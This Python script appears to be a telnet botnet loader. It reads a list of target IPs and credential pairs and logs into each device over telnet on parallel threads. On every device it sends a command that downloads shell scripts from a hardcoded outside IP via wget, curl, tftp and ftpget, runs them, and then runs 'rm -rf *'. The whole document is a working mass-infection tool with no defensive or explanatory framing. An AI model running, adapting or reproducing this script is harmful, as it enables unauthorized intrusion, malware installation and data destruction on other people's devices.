import sys
import time
import socket
import colorama
import threading

colorama.init()

if len(sys.argv) < 2:
    sys.exit("\033[37mUsage: python " + sys.argv[0] + " <List>")

lst = open(sys.argv[1], "r")
stripped_lst = map(lambda s: s.strip(), lst)

cmd = "cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://46.101.23.74/bin.sh; curl -O http://46.101.23.74/bin.sh; chmod 777 bin.sh; sh bin.sh; tftp 46.101.23.74 -c get bin.sh; chmod 777 bin.sh; sh bin.sh; tftp -r bin2.sh -g 46.101.23.74; chmod 777 bin2.sh; sh bin2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.101.23.74 bin1.sh bin1.sh; sh bin1.sh; rm -rf bin.sh bin.sh bin2.sh bin1.sh; rm -rf *"

def load(ip, port, username, password):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))

        if "ogin" in read_until(sock, "ogin"):
            sock.send(username + b"\r\n")
            print("\033[32m[\033[31m+\033[32m] \033[35mSending username!\033[37m {}".format(ip))

        if "assword" in read_until(sock, "assword"):
            sock.send(password + b"\r\n")
            print("\033[32m[\033[33m+\033[32m] \033[36mSending password!\033[37m {}".format(ip))
        
        sock.send(b"sh" + b"\r\n")
        sock.send(b"shell" + b"\r\n")
        sock.send(cmd + b"\r\n")
        
        print("\033[32m[\033[31m+\033[32m] \033[32mCommand sent!\033[37m {}".format(ip))
        
        time.sleep(15)
    except socket.error:
        print("\033[32m[\033[31m+\033[32m] \033[31mConnection failure!\033[37m {}".format(ip))
    except Exception:
        pass
    finally:
        sock.close()

def read_until(sock, string):
    data = ""
    start_time = time.time()
    
    while time.time() - start_time < 8:
        try:
            portion = sock.recv(128).decode("utf-8")

            if string in portion:
                data = portion
                break
        except socket.error:
            pass
        except UnicodeDecodeError:
            pass

    return data.strip()

for info in stripped_lst:
    try:
        conn, creds = info.split(" ")
        ip, port = conn.split(":")
        username, password = creds.split(":")

        session = threading.Thread(target=load, args=(ip, int(port), username.encode("utf-8"), password.encode("utf-8")))
        session.start()

        time.sleep(0.02)
    except:
        pass
